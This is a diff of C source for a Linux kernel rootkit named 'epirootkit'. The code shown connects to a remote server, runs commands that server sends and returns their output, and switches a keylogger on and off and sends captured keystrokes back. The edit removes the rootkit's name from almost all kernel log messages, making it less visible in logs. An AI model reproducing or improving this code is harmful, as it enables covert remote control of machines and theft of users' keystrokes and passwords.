@@ -18,7 +18,7 @@ int close_socket(void)
 	if (sock) {
 		sock_release(sock);
 		sock = NULL;
-		pr_info("epirootkit: close_comm: socket released\n");
+		pr_info("close_socket: socket released\n");
 	}
 	return SUCCESS;
 }
@@ -46,7 +46,7 @@ int send_to_server(char *message)
 	int ret_code = 0;
 
 	if (!sock) {
-		pr_err("epirootkit: send_to_server: socket is NULL\n");
+		pr_err("send_to_server: socket is NULL\n");
 		return -FAILURE;
 	}
 
@@ -55,7 +55,7 @@ int send_to_server(char *message)
 
 	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
 	if (ret_code < 0) {
-		pr_err("epirootkit: send_to_server: failed to send message: %d\n", ret_code);
+		pr_err("send_to_server: failed to send message: %d\n", ret_code);
 		return -FAILURE;
 	}
 
@@ -79,14 +79,14 @@ int network_worker(void *data)
 
 	// Convert IP address string into 4-byte binary format
 	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
-		pr_err("epirootkit: network_worker: invalid IPv4\n");
+		pr_err("network_worker: invalid IPv4\n");
 		return -FAILURE;
 	}
 
 	// Create a TCP socket in kernel space
 	ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
 	if (ret_code < 0) {
-		pr_err("epirootkit: network_worker: socket creation failed: %d\n", ret_code);
+		pr_err("network_worker: socket creation failed: %d\n", ret_code);
 		return -FAILURE;
 	}
 
@@ -100,7 +100,7 @@ int network_worker(void *data)
 	while (!kthread_should_stop()) {
 		ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
 		if (ret_code < 0) {
-			pr_err("epirootkit: network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
+			pr_err("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			continue;
 		}
@@ -114,7 +114,7 @@ int network_worker(void *data)
 	do {
 		ret_code = send_to_server(message);
 		if (ret_code != SUCCESS) {
-			pr_err("epirootkit: network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
+			pr_err("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			attempts++;
 		}
@@ -122,11 +122,11 @@ int network_worker(void *data)
 
 	// If all attempts to send the message failed, abort
 	if (ret_code < 0) {
-		pr_err("epirootkit: network_worker: failed to send message after 10 attempts, giving up.\n");
+		pr_err("network_worker: failed to send message after 10 attempts, giving up.\n");
 		return -FAILURE;
 	}
 
-	pr_info("epirootkit: network_worker: message sent to %s:%d\n", ip, port);
+	pr_info("network_worker: message sent to %s:%d\n", ip, port);
 
 	// Listen for commands
 	// Retry until 'killcom' is received or thread is stopped by unmonting the module
@@ -141,14 +141,14 @@ int network_worker(void *data)
 		// Wait to receive a message from the server
 		ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
 		if (ret_code < 0) {
-			pr_err("epirootkit: network_worker: error receiving message: %d\n", ret_code);
+			pr_err("network_worker: error receiving message: %d\n", ret_code);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			continue;
 		}
 
 		// Null-terminate the received message
 		recv_buffer[ret_code] = '\0';
-		pr_info("epirootkit: network_worker: received: %s", recv_buffer);
+		pr_info("network_worker: received: %s", recv_buffer);
 
 		// Parse and handle the received command
 		if (strncmp(recv_buffer, "exec ", 5) == 0) {
@@ -166,17 +166,17 @@ int network_worker(void *data)
 						exec_result.std_out, exec_result.std_err, exec_result.code);
 			ret_code = send_to_server(result_msg);
 			if (ret_code != SUCCESS) {
-				pr_err("epirootkit: network_worker: failed to send result message\n");
+				pr_err("network_worker: failed to send result message\n");
 			}
-			pr_info("epirootkit: network_worker: command result sent\n");
+			pr_info("network_worker: command result sent\n");
 		} else if (strncmp(recv_buffer, "klgon ", 5) == 0) {
 			epikeylog_init(0);
 			send_to_server("keylogger activated\n");
-			pr_info("epirootkit: network_worker: keylogger activated\n");
+			pr_info("network_worker: keylogger activated\n");
 		} else if (strncmp(recv_buffer, "klgoff", 6) == 0) {
 			epikeylog_exit();
 			send_to_server("keylogger deactivated\n");
-			pr_info("epirootkit: network_worker: keylogger deactivated\n");
+			pr_info("network_worker: keylogger deactivated\n");
 		} else if (strncmp(recv_buffer, "klg", 3) == 0) {
 			epikeylog_send_to_server();
 			pr_info("epirootkit: network_worker: keylogger content sent\n");
@@ -190,7 +190,7 @@ int network_worker(void *data)
 	}
 
 	// Final cleanup before thread exits
-	pr_info("epirootkit: network_worker: thread ends.\n");
+	pr_info("network_worker: thread ends.\n");
 	thread_exited = true;
 	close_socket();
 
